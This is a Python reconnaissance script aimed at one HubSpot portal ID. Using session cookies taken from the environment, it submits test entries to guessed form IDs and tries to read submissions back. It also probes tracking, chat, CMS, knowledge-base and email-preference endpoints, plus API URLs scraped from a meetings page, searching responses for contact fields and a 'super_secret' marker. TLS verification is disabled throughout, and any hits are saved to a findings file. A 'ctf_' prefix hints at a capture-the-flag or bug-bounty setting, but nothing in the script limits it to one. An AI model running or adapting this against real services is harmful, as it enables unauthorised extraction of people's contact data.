#!/usr/bin/env python3
"""
Try PUBLIC APIs that don't require private app installation
Focus on tracking, analytics, forms, and other public endpoints
"""

import requests
import json
import os
import urllib3
from dotenv import load_dotenv
import time

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = '46962361'

print("="*80)
print("TESTING PUBLIC APIs (NO APP INSTALLATION REQUIRED)")
print("="*80)

findings = []

session = requests.Session()
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        session.cookies.set(key, value, domain='.hubspot.com')

# ============================================================================
# 1. PUBLIC FORM SUBMISSION API (THEN TRY TO VIEW SUBMISSIONS)
# ============================================================================

print("\n[1] SUBMITTING TO PUBLIC FORMS AND CHECKING SUBMISSIONS")
print("="*80)

# Try submitting to forms and see if we can retrieve the data
form_ids = [1, 3, 4, 5, 6, 8, 13, 18, 1000]

for form_id in form_ids:
    print(f"\n--- Form {form_id} ---")

    # Public submission endpoint
    submit_url = f'https://api.hsforms.com/submissions/v3/integration/submit/{TARGET_PORTAL}/{form_id}'

    payload = {
        'fields': [
            {'name': 'email', 'value': f'ctf_public_{form_id}_{int(time.time())}@test.com'},
            {'name': 'firstname', 'value': f'PublicTest_{form_id}'},
        ],
        'context': {
            'pageUri': 'https://example.com/test',
            'pageName': 'Test Page'
        }
    }

    try:
        r = requests.post(submit_url, json=payload, verify=False, timeout=10)

        print(f"  Submit: {r.status_code}")

        if r.status_code == 200:
            print(f"  *** SUBMISSION SUCCESSFUL! ***")

            try:
                data = r.json()
                print(f"  Response: {json.dumps(data, indent=2)[:300]}")

                # Check if we got a submission ID
                if 'inlineMessage' in data:
                    print(f"  Message: {data['inlineMessage'][:100]}")
            except:
                print(f"  Text: {r.text[:200]}")

            # Now try to view the submission
            print(f"\n  Trying to view submission...")

            view_urls = [
                f'https://api.hubapi.com/form-integrations/v1/submissions/forms/{form_id}?portalId={TARGET_PORTAL}',
                f'https://api.hsforms.com/submissions/v3/integration/submissions/{TARGET_PORTAL}/{form_id}',
            ]

            for view_url in view_urls:
                try:
                    r2 = session.get(view_url, verify=False, timeout=5)

                    if r2.status_code == 200:
                        print(f"    *** SUBMISSIONS VISIBLE! ***")
                        print(f"    {view_url[:60]}")

                        try:
                            sub_data = r2.json()
                            print(f"    {json.dumps(sub_data, indent=2)[:400]}")

                            findings.append({
                                'type': 'form_submissions_visible',
                                'form_id': form_id,
                                'url': view_url,
                                'data': sub_data
                            })
                        except:
                            pass
                except:
                    pass
    except:
        pass

    time.sleep(0.3)

# ============================================================================
# 2. PUBLIC TRACKING/ANALYTICS APIs
# ============================================================================

print("\n" + "="*80)
print("[2] TESTING PUBLIC TRACKING APIs")
print("="*80)

# These APIs might not require app installation
tracking_urls = [
    f'https://api.hubapi.com/events/v3/events?portalId={TARGET_PORTAL}',
    f'https://track.hubspot.com/v1/track-event?portalId={TARGET_PORTAL}',
    f'https://api.hubapi.com/email/public/v1/subscriptions/{TARGET_PORTAL}',
]

for url in tracking_urls:
    print(f"\n{url[:70]}...")

    try:
        r = requests.get(url, verify=False, timeout=10)

        print(f"  GET: {r.status_code}")

        if r.status_code == 200:
            print(f"  *** ACCESSIBLE! ***")

            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:400]}")

                if 'firstname' in json.dumps(data).lower() or 'super_secret' in json.dumps(data).lower():
                    findings.append({'type': 'tracking_api', 'url': url, 'data': data})
            except:
                print(f"  Response: {r.text[:200]}")
    except:
        pass

# ============================================================================
# 3. PUBLIC MEETINGS/CALENDAR DATA
# ============================================================================

print("\n" + "="*80)
print("[3] EXTRACTING DATA FROM PUBLIC MEETINGS")
print("="*80)

# The meetings page we know is accessible
meeting_url = 'https://meetings.hubspot.com/nicksec'

try:
    r = requests.get(meeting_url, verify=False, timeout=10)

    if r.status_code == 200:
        print(f"Status: {r.status_code}")

        # Try to book a meeting and see if we can get contact data
        print("\n  Looking for booking API...")

        # Check for embedded API endpoints
        import re

        api_matches = re.findall(r'(https://[^"\']+api[^"\']+)', r.text)

        unique_apis = list(set(api_matches))[:20]

        if unique_apis:
            print(f"  Found {len(unique_apis)} API endpoints:")

            for api_url in unique_apis:
                print(f"    {api_url[:80]}")

                # Try accessing each one
                try:
                    r2 = requests.get(api_url, verify=False, timeout=3)

                    if r2.status_code == 200:
                        print(f"      *** ACCESSIBLE! Status: {r2.status_code} ***")

                        try:
                            data = r2.json()

                            if 'firstname' in json.dumps(data).lower():
                                print(f"      Contains contact data!")
                                findings.append({'type': 'meetings_api', 'url': api_url, 'data': data})
                        except:
                            pass
                except:
                    pass
except:
    pass

# ============================================================================
# 4. PUBLIC KNOWLEDGE BASE / HELP CENTER
# ============================================================================

print("\n" + "="*80)
print("[4] CHECKING PUBLIC KNOWLEDGE BASE")
print("="*80)

kb_urls = [
    f'https://api.hubapi.com/knowledge/v1/knowledge-base/{TARGET_PORTAL}',
    f'https://knowledge.hubspot.com/{TARGET_PORTAL}',
]

for url in kb_urls:
    print(f"\n{url}")

    try:
        r = requests.get(url, verify=False, timeout=10)

        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"  *** ACCESSIBLE! ***")

            if 'firstname' in r.text.lower() or 'contact' in r.text.lower():
                print(f"  Contains contact keywords!")
    except:
        pass

# ============================================================================
# 5. PUBLIC CMS PAGES / LANDING PAGES
# ============================================================================

print("\n" + "="*80)
print("[5] CHECKING FOR PUBLIC CMS PAGES WITH CONTACT DATA")
print("="*80)

# Try common CMS page patterns
cms_patterns = [
    f'https://{TARGET_PORTAL}.hs-sites.com/contact-us',
    f'https://{TARGET_PORTAL}.hs-sites.com/thank-you',
    f'https://{TARGET_PORTAL}.hs-sites.com/welcome',
    f'https://{TARGET_PORTAL}.hs-sites.com/profile',
]

for url in cms_patterns:
    print(f"\n{url}")

    try:
        r = requests.get(url, verify=False, timeout=10)

        if r.status_code == 200:
            print(f"  *** PAGE FOUND! ***")
            print(f"  Size: {len(r.text)} bytes")

            if 'firstname' in r.text.lower() or 'super_secret' in r.text.lower():
                print(f"  *** CONTAINS CONTACT KEYWORDS! ***")

                # Save it
                with open(f'findings/cms_page_{url.split("/")[-1]}.html', 'w') as f:
                    f.write(r.text)

                findings.append({'type': 'cms_page', 'url': url})
    except:
        pass

# ============================================================================
# 6. PUBLIC EMAIL SUBSCRIPTION CENTER
# ============================================================================

print("\n" + "="*80)
print("[6] CHECKING EMAIL SUBSCRIPTION CENTER")
print("="*80)

# Try to access subscription preferences (sometimes shows contact data)
sub_urls = [
    f'https://app.hubspot.com/email-preferences/{TARGET_PORTAL}',
    f'https://preferences.hubspot.com/{TARGET_PORTAL}',
]

for url in sub_urls:
    print(f"\n{url}")

    try:
        r = session.get(url, verify=False, timeout=10)

        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"  Size: {len(r.text)} bytes")

            if 'email' in r.text.lower() and len(r.text) > 50000:
                print(f"  *** MAY CONTAIN SUBSCRIPTION DATA! ***")
    except:
        pass

# ============================================================================
# 7. PUBLIC CHAT/CONVERSATIONS API
# ============================================================================

print("\n" + "="*80)
print("[7] TESTING PUBLIC CHAT APIs")
print("="*80)

chat_urls = [
    f'https://api.hubapi.com/conversations/v3/visitor-identification/tokens/create',
    f'https://api.hubapi.com/livechat-public/v1/message/{TARGET_PORTAL}',
]

for url in chat_urls:
    print(f"\n{url[:70]}...")

    # Try GET
    try:
        r = requests.get(url, verify=False, timeout=10)

        print(f"  GET: {r.status_code}")

        if r.status_code == 200:
            print(f"  *** ACCESSIBLE! ***")

            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:300]}")
            except:
                pass
    except:
        pass

    # Try POST
    try:
        r = requests.post(url, json={'portalId': TARGET_PORTAL}, verify=False, timeout=10)

        if r.status_code not in [404, 405]:
            print(f"  POST: {r.status_code}")

            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:300]}")
            except:
                pass
    except:
        pass

print("\n" + "="*80)
print("PUBLIC API TESTING COMPLETE")
print("="*80)

if findings:
    print(f"\n*** FOUND {len(findings)} ACCESSIBLE PUBLIC APIs! ***\n")

    with open('/home/user/Hub/findings/PUBLIC_API_FINDINGS.json', 'w') as f:
        json.dump(findings, f, indent=2)

    for finding in findings:
        print(f"\n{json.dumps(finding, indent=2)[:600]}")
else:
    print("\nNo accessible public APIs found.")
    print("Trying next approach...")
